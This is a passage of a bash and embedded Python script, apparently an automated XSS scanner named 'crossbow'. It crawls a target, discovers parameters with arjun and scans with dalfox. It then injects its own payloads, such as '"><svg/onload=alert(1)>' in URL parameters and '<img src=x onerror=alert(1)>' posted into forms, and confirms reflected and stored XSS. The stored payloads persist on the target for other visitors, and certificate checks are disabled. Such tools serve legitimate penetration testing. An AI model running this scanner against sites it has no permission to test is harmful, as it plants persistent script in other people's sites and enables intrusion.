    CRAWL_COUNT=$(wc -l < "$OUTDIR/crawled.txt")
    log_ok "$CRAWL_COUNT URLs crawled ${DIM}($(elapsed $P1))${RESET}"

    if [[ $CRAWL_COUNT -eq 0 ]]; then
        log_warn "No URLs found — check target and cookies"
        exit 1
    fi
elif [[ -n "$CRAWL_FILE" ]]; then
    log_phase "Phase 1/3 — Crawl (skipped, using $CRAWL_FILE)"
    cp "$CRAWL_FILE" "$OUTDIR/crawled.txt"
    CRAWL_COUNT=$(wc -l < "$OUTDIR/crawled.txt")
    log_ok "Loaded $CRAWL_COUNT URLs from file"
else
    log_phase "Phase 1/3 — Crawl (skipped)"
fi

# ── Helper: run arjun discovery ───────────────────────────────
run_arjun() {
    awk -F'?' '{print $1}' "$OUTDIR/crawled.txt" | sort -u > "$OUTDIR/paths.txt"
    PATHS_COUNT=$(wc -l < "$OUTDIR/paths.txt")
    log_info "$PATHS_COUNT unique paths to probe"

    mkdir -p "$OUTDIR/arjun_chunks"
    local actual=$THREADS
    (( PATHS_COUNT < actual )) && actual=$PATHS_COUNT
    (( actual < 1 )) && actual=1

    split -n "l/$actual" "$OUTDIR/paths.txt" "$OUTDIR/arjun_chunks/chunk_"

    local pids=()
    for chunk in "$OUTDIR"/arjun_chunks/chunk_*; do
        [[ ! -s "$chunk" ]] && continue
        local cid=$(basename "$chunk")

        local acmd=(arjun -i "$chunk"
             -w "$ARJ_WL" -t "$ARJ_THR" -c "$ARJ_CHK"
             -oJ "$OUTDIR/arjun_chunks/${cid}.json" -T 10)

        [[ $ARJ_DLY  -gt 0 ]] && acmd+=(-d "$ARJ_DLY")
        [[ $ARJ_PASS -eq 1 ]] && acmd+=(--passive)
        [[ -n "$ARJUN_H" ]] && acmd+=(--headers "$ARJUN_H")
        [[ -n "$ARJ_EXTRA" ]] && { read -ra _x <<< "$ARJ_EXTRA"; acmd+=("${_x[@]}"); }

        if [[ $VERBOSE -eq 1 ]]; then
            timeout "$ARJ_TIMEOUT" "${acmd[@]}" 2>&1 &
        else
            timeout "$ARJ_TIMEOUT" "${acmd[@]}" > "$OUTDIR/arjun_chunks/${cid}.log" 2>&1 &
        fi
        pids+=($!)
    done

    log_info "Launched ${#pids[@]} parallel arjun workers"
    for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null || true; done

    [[ $VERBOSE -eq 0 ]] && grep -hE "^\[[\+]" "$OUTDIR"/arjun_chunks/*.log 2>/dev/null || true

    python3 -c "
import json, glob, sys, os
merged = {}
for f in sorted(glob.glob(os.path.join(sys.argv[1], 'arjun_chunks', '*.json'))):
    try:
        data = json.load(open(f))
        merged.update(data)
    except (json.JSONDecodeError, FileNotFoundError):
        pass
if merged:
    json.dump(merged, open(sys.argv[2], 'w'), indent=2)
" "$OUTDIR" "$OUTDIR/arjun.json"

    ENRICHED_COUNT=0
    if [[ -s "$OUTDIR/arjun.json" ]]; then
        python3 -c "
import json, sys
data = json.load(open(sys.argv[1]))
with open(sys.argv[2], 'w') as f:
    for url, info in data.items():
        params = info if isinstance(info, list) else info.get('params', [])
        if params:
            qs = '&'.join(f'{p}=FUZZ' for p in params)
            sep = '&' if '?' in url else '?'
            f.write(f'{url}{sep}{qs}\n')
" "$OUTDIR/arjun.json" "$OUTDIR/enriched.txt"
        ENRICHED_COUNT=$(wc -l < "$OUTDIR/enriched.txt")
    fi
}

# ── Helper: build dalfox command ──────────────────────────────
build_dalfox_cmd() {
    local input="$1" output="$2"
    DFX_MCT=$(( THREADS * 15 ))
    (( DFX_MCT > 50 )) && DFX_MCT=50

    DCMD=(dalfox scan -i file "$input"
         --workers "$DFX_WRK" --max-concurrent-targets "$DFX_MCT"
         -f "$FORMAT" -o "$output"
         --stream-findings)

    [[ $DFX_DEEP   -eq 1 ]] && DCMD+=(--deep-scan)
    [[ $DFX_EXTJS  -eq 1 ]] && DCMD+=(--analyze-external-js)
    [[ $DFX_HPP    -eq 1 ]] && DCMD+=(--hpp)
    [[ $DFX_LIBS   -eq 1 ]] && DCMD+=(--detect-outdated-libs)
    [[ $DFX_RL     -gt 0 ]] && DCMD+=(--rate-limit "$DFX_RL")
    [[ $DFX_DLY    -gt 0 ]] && DCMD+=(--delay "$DFX_DLY")
    [[ -n "$DFX_REMOTE" ]]  && DCMD+=(--remote-payloads "$DFX_REMOTE")
    [[ -n "$DFX_ENC" ]]     && DCMD+=(-e "$DFX_ENC")
    [[ -n "$PROXY" ]]       && DCMD+=(--proxy "$PROXY")
    [[ -n "$BLIND_URL" ]]   && DCMD+=(--blind "$BLIND_URL")
    [[ $OOB -eq 1 ]]        && DCMD+=(--blind-oob)
    [[ -n "$SXSS_URL" ]]    && DCMD+=(--sxss --sxss-url "$SXSS_URL")
    [[ -n "$DFX_EXTRA" ]]   && { read -ra _x <<< "$DFX_EXTRA"; DCMD+=("${_x[@]}"); }
    [[ $VERBOSE -eq 1 ]]    && DCMD+=(--debug)
    DCMD+=("${DALFOX_H[@]}")
}

run_dalfox() {
    local input="$1" output="$2"
    build_dalfox_cmd "$input" "$output"
    if [[ $VERBOSE -eq 1 ]]; then
        "${DCMD[@]}" 2>&1 || true
    else
        "${DCMD[@]}" 2>&1 | grep -v -E "^[[:space:]]*(░|█|▓|▒|╔|║|╚|████|Dalfox v|Powerful open|and utility|$)" || true
    fi
}

# ── Phase 2+3 ─────────────────────────────────────────────────
RESULTS_FILE="$OUTDIR/results.${FMT_EXT}"
PATHS_COUNT=0  ENRICHED_COUNT=0

if [[ $SONIC -eq 1 && $SKIP_SCAN -eq 0 && -s "$OUTDIR/crawled.txt" ]]; then
    # ── SONIC: arjun + dalfox run in parallel ──
    log_phase "Phase 2+3 — SONIC (arjun + dalfox in parallel)"
    P2=$SECONDS

    if [[ $SKIP_ARJUN -eq 0 ]]; then
        log_info "Starting arjun in background..."
        run_arjun &
        ARJUN_BG=$!
    fi

    log_info "Starting dalfox on crawled URLs..."
    run_dalfox "$OUTDIR/crawled.txt" "$RESULTS_FILE"

    if [[ $SKIP_ARJUN -eq 0 ]]; then
        wait "$ARJUN_BG" 2>/dev/null || true
        log_ok "Arjun finished: $ENRICHED_COUNT enriched URLs"

        if [[ -s "$OUTDIR/enriched.txt" ]]; then
            # Second quick pass on ONLY the newly discovered params
            comm -23 <(sort "$OUTDIR/enriched.txt") <(sort "$OUTDIR/crawled.txt") > "$OUTDIR/new_targets.txt"
            if [[ -s "$OUTDIR/new_targets.txt" ]]; then
                NEW=$(wc -l < "$OUTDIR/new_targets.txt")
                log_info "Second pass: $NEW new targets from arjun"
                run_dalfox "$OUTDIR/new_targets.txt" "$OUTDIR/results_extra.${FMT_EXT}"
                cat "$OUTDIR/results_extra.${FMT_EXT}" >> "$RESULTS_FILE" 2>/dev/null || true
            fi
        fi
    fi

    cat "$OUTDIR/crawled.txt" "$OUTDIR/enriched.txt" 2>/dev/null | sort -u > "$OUTDIR/targets.txt"
    log_ok "Sonic scan complete ${DIM}($(elapsed $P2))${RESET}"

else
    # ── Normal sequential flow ──
    if [[ $SKIP_ARJUN -eq 0 && -s "$OUTDIR/crawled.txt" ]]; then
        log_phase "Phase 2/3 — Discover (arjun × $THREADS)"
        P2=$SECONDS
        run_arjun
        cat "$OUTDIR/crawled.txt" "$OUTDIR/enriched.txt" 2>/dev/null | sort -u > "$OUTDIR/targets.txt"
        TOTAL_TARGETS=$(wc -l < "$OUTDIR/targets.txt")
        log_ok "$ENRICHED_COUNT enriched, $TOTAL_TARGETS total targets ${DIM}($(elapsed $P2))${RESET}"
    else
        [[ $SKIP_ARJUN -eq 1 ]] && log_phase "Phase 2/3 — Discover (skipped)"
        [[ -s "$OUTDIR/crawled.txt" ]] && cp "$OUTDIR/crawled.txt" "$OUTDIR/targets.txt"
    fi

    # ── GET form discovery: extract search/filter forms katana missed ──
    if [[ -s "$OUTDIR/crawled.txt" ]]; then
        GET_FORMS=$(python3 << 'PYEOF' - "$OUTDIR/crawled.txt" "${DALFOX_H[1]:-}"
import sys, re, urllib.request, urllib.parse, ssl

crawled_file = sys.argv[1]
header = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else None

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def fetch(url):
    try:
        req = urllib.request.Request(url)
        if header:
            k, v = header.split(':', 1)
            req.add_header(k.strip(), v.strip())
        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
        return resp.read().decode('utf-8', errors='replace')
    except Exception:
        return ''

with open(crawled_file) as f:
    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))

parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''

all_urls = set(crawled)
to_visit = list(crawled)
for depth in range(2):
    new_found = []
    for url in to_visit:
        html = fetch(url)
        if not html:
            continue
        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
            if full.startswith(base_url) and full not in all_urls:
                all_urls.add(full)
                new_found.append(full)
    to_visit = new_found

seen = set()
for url in sorted(all_urls):
    html = fetch(url)
    if not html:
        continue
    for fm in re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
        form_head = re.match(r'<form\b[^>]*>', fm.group(0), re.IGNORECASE).group(0)
        method = re.search(r'method=["\']?(\w+)', form_head, re.IGNORECASE)
        method = method.group(1).upper() if method else 'GET'
        if method != 'GET':
            continue
        action = re.search(r'action=["\']([^"\']*)', form_head, re.IGNORECASE)
        action_url = urllib.parse.urljoin(url, action.group(1)) if action else url
        body = fm.group(1)
        params = []
        for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
            tag = inp.group(0)
            itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
            itype = itype.group(1).lower() if itype else ''
            if itype in ('hidden', 'submit', 'button'):
                continue
            iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
            if iname:
                params.append(f"{iname.group(1)}=FUZZ")
        if params:
            target = action_url.split('?')[0] + '?' + '&'.join(params)
            if target not in seen:
                seen.add(target)
                print(target)
PYEOF
        )
        if [[ -n "$GET_FORMS" ]]; then
            GET_COUNT=$(echo "$GET_FORMS" | wc -l)
            echo "$GET_FORMS" >> "$OUTDIR/targets.txt"
            sort -u -o "$OUTDIR/targets.txt" "$OUTDIR/targets.txt"
            TOTAL_TARGETS=$(wc -l < "$OUTDIR/targets.txt")
            log_ok "$GET_COUNT GET form targets discovered, $TOTAL_TARGETS total targets"
        fi
    fi

    if [[ $SKIP_SCAN -eq 0 ]]; then
        INPUT="$OUTDIR/targets.txt"
        [[ ! -s "$INPUT" ]] && INPUT="$OUTDIR/crawled.txt"
        [[ ! -s "$INPUT" ]] && { log_warn "No targets to scan"; exit 1; }

        log_phase "Phase 3/3 — Scan (dalfox)"
        P3=$SECONDS
        run_dalfox "$INPUT" "$RESULTS_FILE"
        log_ok "Scan complete ${DIM}($(elapsed $P3))${RESET}"
    else
        log_phase "Phase 3/3 — Scan (skipped)"
    fi
fi

# ── Recheck: interaction-dependent [V] findings ──────────────
recheck_interaction_findings() {
    local results="$1"
    [[ ! -s "$results" ]] && return
    [[ "$FORMAT" != "plain" ]] && return

    local curl_h=()
    for ((i=0; i<${#DALFOX_H[@]}; i+=2)); do
        curl_h+=(-H "${DALFOX_H[$((i+1))]}")
    done

    python3 << 'PYEOF' - "$results" "${curl_h[@]}"
import re, sys, subprocess, urllib.parse

results_file = sys.argv[1]
curl_h = sys.argv[2:]

ansi = re.compile(r'\x1b\[[0-9;]*m')
interaction_re = re.compile(
    r'\bon(mouseover|mouseenter|mouseleave|mouseout|mousedown|mouseup|'
    r'mousemove|focus|blur|click|dblclick|contextmenu|touchstart|touchend|'
    r'keydown|keyup|keypress|scroll)\b', re.I)

with open(results_file) as f:
    raw = f.read()
clean = ansi.sub('', raw)

blocks = re.split(r'(?=\[POC\])', clean)
rechecks = []
for block in blocks:
    if not block.startswith('[POC][V]'):
        continue
    pm = re.search(r'Payload:\s*(.+)', block)
    if not pm:
        continue
    payload = pm.group(1).strip()
    if not interaction_re.search(payload):
        continue
    um = re.search(r'https?://\S+', block.split('\n')[0])
    if not um:
        continue
    url = um.group(0).strip()
    method = 'GET'
    if '[POST]' in block.split('\n')[0]:
        method = 'POST'
    rechecks.append((url, payload, method))

if not rechecks:
    sys.exit(0)

breakout = '"><svg/onload=alert(1)>'
added = []
for url, orig_payload, method in rechecks:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    target_param = None
    for k, vals in params.items():
        for v in vals:
            if interaction_re.search(urllib.parse.unquote(v)):
                target_param = k
                break
    if not target_param:
        continue

    new_params = []
    for k, vals in params.items():
        if k == target_param:
            new_params.append((k, breakout))
        else:
            for v in vals:
                new_params.append((k, v))
    new_query = urllib.parse.urlencode(new_params)
    new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

    try:
        cmd = ['curl', '-sk', '-m', '10', '-o', '-']
        for i in range(0, len(curl_h), 2):
            if i+1 < len(curl_h):
                cmd += [curl_h[i], curl_h[i+1]]
        cmd.append(new_url)
        resp = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        body = resp.stdout
        if '<svg/onload=alert(1)>' in body or '<svg onload=alert(1)>' in body:
            added.append((new_url, target_param, orig_payload))
    except Exception:
        pass

R = '\033[0m'
RED = '\033[31m'
DIM = '\033[90m'
GR = '\033[38;5;247m'
GRN = '\033[32m'
YEL = '\033[33m'

if added:
    with open(results_file, 'a') as f:
        f.write(f'\n{DIM}--- crossbow recheck: {len(added)} finding(s) upgraded with self-executing payload ---{R}\n\n')
        for url, param, orig in added:
            event = interaction_re.search(orig)
            ev_name = event.group(0) if event else 'event handler'
            f.write(f'{GRN}⚡ [CB][V][GET][tag-breakout]{R} {RED}{url}{R}\n')
            f.write(f'  {DIM}├──{R} {GR}Issue:{R} {GR}tag-breakout XSS — self-executing, no user interaction needed{R}\n')
            f.write(f'  {DIM}├──{R} {YEL}Why:{R} {GR}dalfox used {ev_name} which needs hover/click (fails on hidden inputs){R}\n')
            f.write(f'  {DIM}├──{R} {GR}Param:{R} {GR}{param}{R}\n')
            f.write(f'  {DIM}└──{R} {GR}Payload:{R} {GR}"><svg/onload=alert(1)>{R}\n')
    print(f"[+] Rechecked {len(rechecks)} interaction-dependent findings: {len(added)} upgraded with tag-breakout")
else:
    print(f"[*] Rechecked {len(rechecks)} interaction-dependent findings: none needed tag-breakout")
PYEOF
}

if [[ $SKIP_SCAN -eq 0 && -s "$RESULTS_FILE" ]]; then
    recheck_interaction_findings "$RESULTS_FILE"
fi

# ── Stored XSS candidate discovery ───────────────────────────
SXSS_FILE="$OUTDIR/stored_xss_candidates.txt"
SXSS_COUNT=0
if [[ $STORED -eq 1 && -s "$OUTDIR/crawled.txt" ]]; then
    python3 << 'PYEOF' - "$OUTDIR/crawled.txt" "$SXSS_FILE" "${DALFOX_H[1]:-}"
import sys, re, urllib.request, urllib.error, urllib.parse, ssl

crawled_file = sys.argv[1]
output_file = sys.argv[2]
header = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3] else None

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

text_types = {'text', 'search', 'url', 'email', 'tel', 'number', ''}
skip_names = {'csrf', 'token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', '__requestverificationtoken'}
skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password', 'reset-password', 'forgot-password'}

def fetch(url):
    try:
        req = urllib.request.Request(url)
        if header:
            k, v = header.split(':', 1)
            req.add_header(k.strip(), v.strip())
        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
        return resp.read().decode('utf-8', errors='replace')
    except Exception:
        return ''

with open(crawled_file) as f:
    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))

parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''

# Follow internal links two levels deep to discover forms katana missed
all_urls = set(crawled)
to_visit = list(crawled)
for depth in range(2):
    new_found = []
    for url in to_visit:
        html = fetch(url)
        if not html:
            continue
        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
            if full.startswith(base_url) and full not in all_urls:
                all_urls.add(full)
                new_found.append(full)
    to_visit = new_found

all_urls = sorted(all_urls)

candidates = []
seen = set()

for url in all_urls:
    html = fetch(url)
    if not html:
        continue

    forms = re.finditer(
        r'<form\b[^>]*>(.*?)</form>',
        html, re.DOTALL | re.IGNORECASE)

    for fm in forms:
        form_tag = fm.group(0)
        form_head = re.match(r'<form\b[^>]*>', form_tag, re.IGNORECASE).group(0)
        method = re.search(r'method=["\']?(\w+)', form_head, re.IGNORECASE)
        method = method.group(1).upper() if method else 'GET'
        if method != 'POST':
            continue

        action = re.search(r'action=["\']([^"\']*)', form_head, re.IGNORECASE)
        action = action.group(1) if action else url

        body = fm.group(1)
        fields = []
        select_fields = []

        for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
            tag = inp.group(0)
            itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
            itype = itype.group(1).lower() if itype else ''
            if itype in ('hidden', 'submit', 'button', 'file'):
                continue
            iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
            if not iname:
                continue
            name = iname.group(1)
            if name.lower() in skip_names:
                continue
            if itype in text_types:
                fields.append((name, 'input', itype or 'text'))

        for ta in re.finditer(r'<textarea\b[^>]*name=["\']([^"\']*)[^>]*>', body, re.IGNORECASE):
            name = ta.group(1)
            if name.lower() not in skip_names:
                fields.append((name, 'textarea', ''))

        for sel in re.finditer(r'<select\b[^>]*name=["\']([^"\']*)[^>]*>(.*?)</select>', body, re.DOTALL | re.IGNORECASE):
            sname = sel.group(1)
            opts = re.findall(r'value=["\']([^"\']*)', sel.group(2))
            select_fields.append((sname, opts))

        if not fields:
            continue
        action_path = action.rstrip('/').rsplit('/', 1)[-1].lower()
        if action_path in skip_actions:
            continue
        key = (url, action, tuple(f[0] for f in fields))
        if key not in seen:
            seen.add(key)
            candidates.append((url, action, method, fields, select_fields))

if candidates:
    with open(output_file, 'w') as f:
        f.write("Stored XSS Candidates — Manual Testing Required\n")
        f.write("=" * 50 + "\n\n")
        f.write("These POST forms accept text input that may be stored\n")
        f.write("and rendered elsewhere. Test each with a unique payload\n")
        f.write("(e.g. <img src=x onerror=alert('FORMNAME')>) and check\n")
        f.write("where the value appears on other pages.\n\n")
        for url, action, method, fields, selects in candidates:
            f.write(f"Page    : {url}\n")
            f.write(f"Action  : {action}\n")
            f.write(f"Method  : {method}\n")
            for name, tag, itype in fields:
                label = tag
                if itype:
                    label = f"{tag} type={itype}"
                f.write(f"  Field : {name} ({label})\n")
            for sname, opts in selects:
                f.write(f"  Select: {sname} (options={','.join(opts[:5])})\n")
            f.write("\n")
else:
    pass
PYEOF
    [[ -s "$SXSS_FILE" ]] && SXSS_COUNT=$(grep -c '^Page' "$SXSS_FILE" 2>/dev/null || true)
    (( SXSS_COUNT > 0 )) && log_ok "$SXSS_COUNT stored XSS candidates → ${DIM}$SXSS_FILE${RESET}"
fi

# ── Stored XSS probe ─────────────────────────────────────────
SXSS_VERIFIED=0
if [[ $STORED -eq 1 && -s "$SXSS_FILE" && ${#DALFOX_H[@]} -gt 0 ]]; then
    log_info "Probing stored XSS candidates..."

    SXSS_VERIFIED=$(CB_VERBOSE=$VERBOSE python3 << 'PYEOF' - "$SXSS_FILE" "$RESULTS_FILE" "${DALFOX_H[@]}"
import sys, os, re, random, string, urllib.request, urllib.parse, urllib.error, ssl, time, json, base64

VERBOSE = os.environ.get('CB_VERBOSE') == '1'
def dbg(msg):
    if VERBOSE:
        print(f'  [DBG] {msg}', file=sys.stderr)

sxss_file = sys.argv[1]
results_file = sys.argv[2]
raw_headers = sys.argv[3:]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

headers = {}
i = 0
while i < len(raw_headers):
    if raw_headers[i] == '-H' and i + 1 < len(raw_headers):
        h = raw_headers[i + 1]
        if ':' in h:
            k, v = h.split(':', 1)
            headers[k.strip()] = v.strip()
        i += 2
    else:
        i += 1

# Try to extract username from session cookie for self-messaging
auth_user = None
cookie_val = headers.get('Cookie', '')
for part in cookie_val.split(';'):
    part = part.strip()
    if part.startswith('session='):
        tok = part.split('=', 1)[1].split('.')[0]
        try:
            pad = tok + '=' * (-len(tok) % 4)
            data = json.loads(base64.b64decode(pad))
            auth_user = data.get('username')
        except Exception:
            pass

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def get(url):
    req = urllib.request.Request(url)
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        return resp.read().decode('utf-8', errors='replace')
    except Exception:
        return ''

def post_no_redirect(url, data):
    encoded = urllib.parse.urlencode(data).encode()
    opener = urllib.request.build_opener(NoRedirectHandler)
    req = urllib.request.Request(url, data=encoded, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        resp = opener.open(req, timeout=10)
        return resp.headers.get('Location', ''), resp.code
    except urllib.error.HTTPError as e:
        return e.headers.get('Location', ''), e.code
    except Exception:
        return '', 0

def resolve(base, rel):
    if not rel:
        return ''
    if rel.startswith('http'):
        return rel
    return urllib.parse.urljoin(base, rel)

# Parse candidates file — now handles Select: lines too
candidates = []
current = None
with open(sxss_file) as f:
    for line in f:
        line = line.rstrip()
        if line.startswith('Page'):
            if current:
                candidates.append(current)
            current = {'page': line.split(':', 1)[1].strip(), 'fields': [], 'selects': {}}
        elif line.startswith('Action') and current:
            current['action'] = line.split(':', 1)[1].strip()
        elif line.startswith('Method') and current:
            current['method'] = line.split(':', 1)[1].strip()
        elif line.strip().startswith('Field') and current:
            m = re.match(r'\s*Field\s*:\s*(\S+)', line)
            if m:
                fname = m.group(1)
                if 'password' not in line.lower():
                    current['fields'].append(fname)
        elif line.strip().startswith('Select') and current:
            m = re.match(r'\s*Select\s*:\s*(\S+)\s*\(options=(.*)\)', line)
            if m:
                sname = m.group(1)
                opts = [o.strip() for o in m.group(2).split(',') if o.strip()]
                current['selects'][sname] = opts
    if current:
        candidates.append(current)

findings = []
tested_patterns = set()
marker_base = 'cbsxss' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def action_pattern(url, fields):
    path = urllib.parse.urlparse(url).path
    norm = re.sub(r'/\d+', '/*', path)
    return (norm, tuple(sorted(fields)))

dbg(f"Parsed {len(candidates)} candidates, auth_user={auth_user}")

for cand in candidates:
    if cand.get('method', '') != 'POST':
        continue
    action = cand.get('action', '')
    if not action:
        continue
    action_url = resolve(cand['page'], action)
    text_fields = [f for f in cand.get('fields', [])]
    if not text_fields:
        continue
    pat = action_pattern(action_url, text_fields)
    if pat in tested_patterns:
        dbg(f"SKIP (dedup) {action_url} fields={text_fields}")
        continue
    tested_patterns.add(pat)

    marker = marker_base + ''.join(random.choices(string.digits, k=4))
    dbg(f"--- {action_url} fields={text_fields} marker={marker}")

    # Build POST data: marker in text fields, sensible defaults for selects
    post_data = {f: marker for f in text_fields}
    for sname, opts in cand.get('selects', {}).items():
        if sname == 'to_user' and auth_user:
            post_data[sname] = auth_user
        elif sname == 'rating':
            post_data[sname] = '5'
        elif opts:
            post_data[sname] = opts[0]

    redirect_loc, status = post_no_redirect(action_url, post_data)
    dbg(f"  POST {status} → redirect={redirect_loc}")
    time.sleep(0.3)

    # Build list of URLs to check for the marker
    check_urls = []
    if redirect_loc:
        rurl = resolve(action_url, redirect_loc)
        if rurl:
            check_urls.append(rurl)
            # Also follow one more redirect from the redirect target
            redirect_body = get(rurl)
            if marker in redirect_body:
                check_urls = [rurl]
            else:
                # Check detail links from the redirect page (listing → detail)
                for href in re.findall(r'href="([^"#]*)"', redirect_body):
                    full = resolve(rurl, href)
                    if full.startswith(action_url.rsplit('/', 2)[0]) and full != rurl:
                        check_urls.append(full)
    check_urls.append(cand['page'])
    # Parent of action URL (e.g., /products/1/review → /products/1)
    parent = action_url.rstrip('/').rsplit('/', 1)[0]
    if parent and parent not in check_urls:
        check_urls.append(parent)

    # Deduplicate while preserving order
    seen_urls = set()
    unique_urls = []
    for u in check_urls:
        if u not in seen_urls:
            seen_urls.add(u)
            unique_urls.append(u)
    check_urls = unique_urls

    found_url = None
    for url in check_urls:
        body = get(url)
        found = marker in body
        dbg(f"  CHECK {url} → marker={'FOUND' if found else 'no'} (len={len(body)})")
        if found:
            found_url = url
            # If this is a listing page, check detail links for the marker too
            for href in re.findall(r'href="([^"#]*)"', body):
                full = resolve(url, href)
                if full != url and full not in seen_urls:
                    detail = get(full)
                    if marker in detail:
                        dbg(f"  → detail page: {full}")
                        found_url = full
                        break
            break

    if not found_url:
        dbg(f"  SKIP: marker not found on any page")
        continue

    # Test each text field individually for XSS
    for field in text_fields:
        xss_id = 'cbv' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        payload = f'<img src=x onerror=alert(1) class={xss_id}>'
        dbg(f"  TEST field={field} xss_id={xss_id}")

        test_data = {f: 'crossbow_safe' for f in text_fields}
        test_data[field] = payload
        for sname, opts in cand.get('selects', {}).items():
            if sname == 'to_user' and auth_user:
                test_data[sname] = auth_user
            elif sname == 'rating':
                test_data[sname] = '5'
            elif opts:
                test_data[sname] = opts[0]

        xss_redirect, _ = post_no_redirect(action_url, test_data)
        time.sleep(0.3)

        render_url = found_url
        body = get(render_url)

        if f'class={xss_id}>' not in body:
            # Check the redirect target from the XSS POST (new entry URL)
            if xss_redirect:
                rurl = resolve(action_url, xss_redirect)
                if rurl and rurl != render_url:
                    rbody = get(rurl)
                    if f'class={xss_id}>' in rbody:
                        render_url = rurl
                        body = rbody
                    else:
                        # Check detail links from redirect (listing) page
                        for href in re.findall(r'href="([^"#]*)"', rbody):
                            full = resolve(rurl, href)
                            if full != rurl:
                                detail = get(full)
                                if f'class={xss_id}>' in detail:
                                    render_url = full
                                    body = detail
                                    break
            # Also check detail links from found_url
            if f'class={xss_id}>' not in body:
                for href in re.findall(r'href="([^"#]*)"', get(found_url)):
                    full = resolve(found_url, href)
                    if full != found_url:
                        detail = get(full)
                        if f'class={xss_id}>' in detail:
                            render_url = full
                            body = detail
                            break

        confirmed = f'class={xss_id}>' in body
        dbg(f"    → {'CONFIRMED at ' + render_url if confirmed else 'not vulnerable'}")

        if confirmed:
            findings.append({
                'render_url': render_url,
                'inject_url': action_url,
                'field': field,
                'payload': payload
            })

R = '\033[0m'
DIM = '\033[90m'
GR = '\033[38;5;247m'
GRN = '\033[32m'
RED = '\033[31m'

if findings:
    with open(results_file, 'a') as f:
        f.write(f'\n{DIM}--- crossbow stored XSS: {len(findings)} finding(s) verified ---{R}\n\n')
        for fi in findings:
            f.write(f'{GRN}[CB][SXSS][V][POST]{R} {RED}{fi["render_url"]}{R}\n')
            f.write(f'  {DIM}├──{R} {GR}Issue:{R} {GR}stored XSS — payload persists and executes for all visitors{R}\n')
            f.write(f'  {DIM}├──{R} {GR}Inject:{R} {GR}POST {fi["inject_url"]} → field: {fi["field"]}{R}\n')
            f.write(f'  {DIM}├──{R} {GR}Renders:{R} {GR}{fi["render_url"]} (unescaped){R}\n')
            f.write(f'  {DIM}└──{R} {GR}Payload:{R} {GR}{fi["payload"]}{R}\n\n')
    print(len(findings), end='')
else:
    print(0, end='')
PYEOF
    )

    if [[ $SXSS_VERIFIED -gt 0 ]]; then
        log_ok "$SXSS_VERIFIED stored XSS verified ${DIM}(crossbow probe)${RESET}"
    else
        log_info "No stored XSS confirmed"
    fi
fi

# ── Summary ────────────────────────────────────────────────────
TOTAL_TIME=$(elapsed $TOTAL_START)

V=0  R=0  A=0  CB=0  SXSS_V=${SXSS_VERIFIED:-0}
if [[ -s "$RESULTS_FILE" ]]; then
    if [[ "$FORMAT" == "plain" ]]; then
        V=$(grep -c '\[POC\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
        R=$(grep -c '\[POC\]\[R\]' "$RESULTS_FILE" 2>/dev/null || true)
        A=$(grep -c '\[POC\]\[A\]' "$RESULTS_FILE" 2>/dev/null || true)
        CB=$(grep -c '\[CB\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
        SXSS_V=$(grep -c '\[CB\]\[SXSS\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
    fi
fi
TOTAL_FINDINGS=$((V + R + A))

echo "" >&2
echo -e "${BOLD}══════════════════════════════════════════${RESET}" >&2
echo -e "${BOLD}  SCAN COMPLETE${RESET}" >&2
echo -e "──────────────────────────────────────────" >&2
echo -e "  Target  : ${BOLD}$TARGET${RESET}" >&2
echo -e "  Profile : $PROFILE" >&2
echo -e "  Time    : $TOTAL_TIME" >&2
echo -e "" >&2
if [[ "$FORMAT" == "plain" ]]; then
    if [[ $SKIP_SCAN -eq 0 ]]; then
        [[ $V -gt 0 ]] && VC="${RED}${BOLD}$V${RESET}" || VC="$V"
        [[ $R -gt 0 ]] && RC="${YELLOW}$R${RESET}" || RC="$R"
        [[ $A -gt 0 ]] && AC="${CYAN}$A${RESET}" || AC="$A"
        echo -e "  ${RED}[V]${RESET} Verified  : $VC" >&2
        echo -e "  ${YELLOW}[R]${RESET} Reflected : $RC" >&2
        echo -e "  ${CYAN}[A]${RESET} DOM (AST) : $AC" >&2
        if [[ $CB -gt 0 ]]; then
